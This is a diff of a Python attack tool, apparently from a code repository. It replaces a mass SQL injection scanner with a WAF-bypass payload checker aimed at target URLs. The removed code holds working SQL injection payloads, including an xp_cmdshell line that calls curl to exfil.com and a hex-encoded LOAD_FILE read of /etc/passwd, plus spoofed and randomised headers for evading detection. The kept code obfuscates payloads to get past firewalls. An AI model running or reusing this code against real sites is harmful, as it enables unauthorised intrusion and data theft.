@@ -17,8 +17,6 @@ from colorama import Fore, Style, init
 
 init(autoreset=True)
 
-#fuck my brain
-
 class WAFBypassEngine:
     @staticmethod
     def generate_evasion(payload):
@@ -103,176 +101,88 @@ class WAFBypassEngine:
             (' ', ['%09', '%0a', '%0d', '%0c', '%0b', '/**/'])
         ]
         for char, replacements in syntax:
-            payload = payload.replace(char, random.choice(replacements))
+            if char in payload:
+                replacement = random.choice(replacements)
+                payload = payload.replace(char, replacement)
         return payload
 
-class SQLiScanner:
-    def __init__(self, proxy=None, threads=5):
-        self.proxy = proxy
-        self.user_agents = self._load_user_agents()
-        self.payloads = self._load_enhanced_payloads()
-        self.tested_urls = set()
-        self.vulnerable = []
-        self.request_count = 0
-        self.scan_start = datetime.datetime.now()
-        self.result_file = f"result-{self.scan_start.strftime('%Y%m%d%H%M%S')}.txt"
-        self.spinner = ['|', '/', '-', '\\']
-        self.lock =  threading.Lock()
+class WAFChecker:
+    def __init__(self, target_url, wordlist, threads=10):
+        self.target_url = target_url
+        self.wordlist = wordlist
+        self.threads = threads
+        self.found_payloads = []
 
-    def _load_user_agents(self):
-        return [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
-        ]
-
-    def _load_enhanced_payloads(self):
-        base_payloads = [
-            "' OR 1=1--",
-            "\" OR \"a\"=\"a",
-            "' UNION SELECT NULL,version()--",
-            "' OR SLEEP({})--".format(random.randint(3, 7)),
-            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))--",
-            "'||(SELECT LOAD_FILE(0x2f6574632f706173737764))--",
-            "'; EXEC xp_cmdshell('curl http://exfil.com')--",
-            "'/**/AND/**/1=CONVERT(int,@@version)--",
-            "'%0a%0dUNION%0aSELECT%0d@version--",
-            "'%ef%bc%87%20OR%ef%bc%91%ef%bc%9d%ef%bc%91--"
-        ]
-        return [WAFBypassEngine.generate_evasion(p) for p in base_payloads]
-
-    def _print_banner(self):
-        print(f"{Style.BRIGHT}{Fore.YELLOW}\n   __| \\ \\  / \\ |  __|   __| __ __| _ \\    \\")
-        print(" \\__ \\  \\  / .  |  _|  \\__ \\    |     /   _ \\")
-        print(" ____/   _| _|\\_| ___| ____/   _|  _|_\\ _/  _\\")
-        print(f"{Style.RESET_ALL}")
-
-    def _print_status(self, message, msg_type="INFO"):
-        color = { "INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, "WARNING": Fore.YELLOW }
-        with self.lock:
-            print(f"\n{Style.BRIGHT}{color[msg_type]}[{msg_type}] {message}{Style.RESET_ALL}")
-
-    def _generate_evasion_headers(self):
-        return {
-            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
-            'Content-Type': random.choice(['application/xml','text/css','application/octet-stream']),
-            'Accept-Encoding': 'br, gzip, deflate',
-            'X-Requested-With': 'XMLHttpRequest',
-            'X-Evasion': ''.join(random.choices('abcdef0123456789', k=16))
-        }
-
-    def _print_runtime_output(self, url, param, payload, status_code, resp_time, vuln_type, timestamp, current, total):
-        symbol = f"{Style.BRIGHT}{Fore.GREEN}✔" if vuln_type else f"{Style.BRIGHT}{Fore.WHITE}{'◌' if current % 2 else '◎'}"
-        url_disp = (url[:40] + '..') if len(url) > 42 else url
-        payload_disp = (payload[:10] + '...') if len(payload) > 13 else payload
-        param_disp = f"{param}: {payload_disp}"
-        ts = timestamp.strftime('%H:%M:%S.%f')[:-3]
-        output_line = (f"\n  {symbol}{Style.RESET_ALL} {Style.BRIGHT}{Fore.MAGENTA}{url_disp:<45}{Style.RESET_ALL} "
-                       f"{Style.BRIGHT}{Fore.CYAN}{param_disp:<25}{Style.RESET_ALL} "
-                       f"{Style.BRIGHT}{Fore.YELLOW}Status: {status_code:<3}{Style.RESET_ALL} "
-                       f"{Style.BRIGHT}{Fore.BLUE}Time: {resp_time:.2f}s{Style.RESET_ALL} "
-                       f"{Style.BRIGHT}{Fore.WHITE}Type: {vuln_type or '-':<12}{Style.RESET_ALL} "
-                       f"{Style.BRIGHT}{Fore.WHITE}{current}/{total} - {ts}{Style.RESET_ALL}")
-        with self.lock:
-            print(output_line)
-
-    def _test_param(self, url, param, payload):
+    def check_payload(self, payload):
+        headers = {'User-Agent': 'Mozilla/5.0'}
         try:
-            parsed = urlparse(url)
-            query = parse_qs(parsed.query)
-            final_payload = WAFBypassEngine.generate_evasion(payload)
-            query[param] = final_payload
-            for _ in range(random.randint(2, 5)):
-                query[f'param_{random.randint(1000,9999)}'] = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-            target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
-            proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
+            response = requests.get(self.target_url, params={'q': payload}, headers=headers, timeout=10)
+            if response.status_code == 200 and payload in response.text:
+                self.found_payloads.append(payload)
+                print(f"{Fore.GREEN}[SUCCESS] Payload found: {payload}")
+                # Simpan URL yang rentan ke dalam file berdasarkan tanggal
+                self.save_vulnerable_url(payload)
+            else:
+                print(f"{Fore.RED}[FAILED] Payload not found: {payload}")
+        except requests.RequestException as e:
+            print(f"{Fore.YELLOW}[ERROR] Request failed for {payload}: {e}")
 
-            method = random.choice(['GET', 'POST', 'OPTIONS', 'PATCH'])
-            headers = {**self._generate_evasion_headers(), 'User-Agent': random.choice(self.user_agents)}
-            cookies = {'session': hashlib.md5(str(random.random()).encode()).hexdigest()}
-            timeout = random.uniform(10, 25)
-            response = requests.request(method=method, url=target_url, headers=headers, cookies=cookies, timeout=timeout, proxies=proxies, verify=True, allow_redirects=random.choice([True, False]))
-            with self.lock:
-                self.request_count += 1
+    def save_vulnerable_url(self, payload):
+        current_date = datetime.datetime.now().strftime("%Y-%m-%d")
+        result_file = f"/results/vuln-{current_date}.txt"
+        # Simpan hanya URL target
+        with open(result_file, 'a') as file:
+            file.write(f"{self.target_url}\n")
 
-            detection = {
-                'error': any(err in response.text.lower() for err in ['sql syntax', 'mysql error', 'warning:', 'unclosed quotation mark']),
-                'time': response.elapsed.total_seconds() > 5,
-                'content_mismatch': len(response.text) < random.randint(500, 1000)
-            }
-            vuln_detected = any(detection.values())
-            vuln_type = None
-            if vuln_detected:
-                if detection['time']:
-                    vuln_type = 'Time-based'
-                elif detection['error']:
-                    vuln_type = 'Error-based'
-                elif detection['content_mismatch']:
-                    vuln_type = 'Content Analysis'
-                else:
-                    vuln_type = 'Behavioral'
-                with self.lock:
-                    self.vulnerable.append({
-                        'url': target_url,
-                        'param': param,
-                        'payload': final_payload,
-                        'type': vuln_type,
-                        'timestamp': datetime.datetime.now()
-                    })
-                self._print_status(f"Vulnerability Found! {target_url}", "SUCCESS")
+    def run_checks(self):
+        print(f"{Fore.CYAN}[INFO] Starting WAF bypass checks on {self.target_url}")
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            for payload in self.wordlist:
+                executor.submit(self.check_payload, payload)
 
-            self._print_runtime_output(url, param, final_payload, response.status_code, response.elapsed.total_seconds(), vuln_type, datetime.datetime.now(), self.request_count, len(self.payloads))
-        except Exception as e:
-            self._print_status(f"Error: {str(e)}", "ERROR")
+    def print_results(self):
+        if self.found_payloads:
+            print(f"{Fore.BLUE}[RESULTS] Found the following working payloads:")
+            for payload in self.found_payloads:
+                print(payload)
+        else:
+            print(f"{Fore.RED}[RESULTS] No working payloads found.")
 
-    def scan_url(self, url):
-        if url in self.tested_urls:
-            return
-        self.tested_urls.add(url)
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-        with ThreadPoolExecutor(max_workers=3) as executor:
-            for param in params:
-                for payload in self.payloads:
-                    executor.submit(self._test_param, url, param, payload)
-
-    def _save_results(self):
-        with open(self.result_file, 'w') as f:
-            f.write(f"Advanced SQLi Scan Report\n{'='*40}\n")
-            f.write(f"Scan Period\t: {self.scan_start.strftime('%Y-%m-%d %H:%M:%S')} to {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"Total Requests\t: {self.request_count}\n")
-            detection_rate = (len(self.vulnerable)/self.request_count*100) if self.request_count else 0
-            f.write(f"Detection Rate\t: {detection_rate:.2f}%\n\n")
-            for idx, vuln in enumerate(self.vulnerable, 1):
-                f.write(f"Detection #{idx}\n{'-'*40}\n")
-                f.write(f"Timestamp\t: {vuln['timestamp'].strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]}\n")
-                f.write(f"Type\t\t: {vuln['type']}\n")
-                f.write(f"Parameter\t: {vuln['param']}\n")
-                f.write(f"Payload\t\t: {vuln['payload']}\n")
-                f.write(f"URL\t\t: {vuln['url']}\n\n")
+def load_wordlist(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            return [line.strip() for line in file.readlines()]
+    except FileNotFoundError:
+        print(f"{Fore.RED}[ERROR] Wordlist file {file_path} not found.")
+        sys.exit(1)
 
 def main():
-    parser = argparse.ArgumentParser(description="Advanced SQLi Cannon")
-    parser.add_argument("-u", type=str, help="Target URL")
-    parser.add_argument("-F", action="store_true", help="Bulk scan from list.txt")
-    parser.add_argument("-p", "--proxy", type=str, help="Proxy server")
-    parser.add_argument("--threads", type=int, default=5, help="Thread count")
-    args = parser.parse_args()
-    
-    scanner = SQLiScanner(proxy=args.proxy, threads=args.threads)
-    scanner._print_banner()
-    
-    try:
-        if args.F:
-            with open("list.txt", "r") as f:
-                urls = [line.strip() for line in f if line.strip()]
-            with ThreadPoolExecutor(max_workers=args.threads) as executor:
-                executor.map(scanner.scan_url, urls)
-        elif args.u:
-            scanner.scan_url(args.u)
-        scanner._save_results()
-        scanner._print_status(f"Results saved to {scanner.result_file}", "SUCCESS")
-    except KeyboardInterrupt:
-        scanner._print_status("Scan aborted!", "ERROR")
+        parser = argparse.ArgumentParser(description="Automated WAF Bypass Tool")
+        parser.add_argument("-u", "--url", required=True, help="Target URL")
+        parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
+        parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use")
+        args = parser.parse_args()
+
+        wordlist = load_wordlist(args.wordlist)
+        waf_checker = WAFChecker(args.url, wordlist, threads=args.threads)
+        waf_checker.run_checks()
+        waf_checker.print_results()
+
+        # Menyimpan URL yang rentan ke file berdasarkan tanggal
+        if waf_checker.found_payloads:
+            date_str = datetime.datetime.now().strftime("%Y-%m-%d")
+            result_file = f"results/vuln-{date_str}.txt"
+
+            if not os.path.exists('results'):
+                os.makedirs('results')  # Membuat direktori jika belum ada
+
+            with open(result_file, 'a') as f:
+                for payload in waf_checker.found_payloads:
+                    # Menyimpan URL lengkap (termasuk parameter query)
+                    f.write(f"{args.url}\n")
+                print(f"{Fore.GREEN}[INFO] Vulnerable URLs saved to {result_file}")
+        else:
+            print(f"{Fore.RED}[INFO] No vulnerabilities found.")
 
 if __name__ == "__main__":
     main()
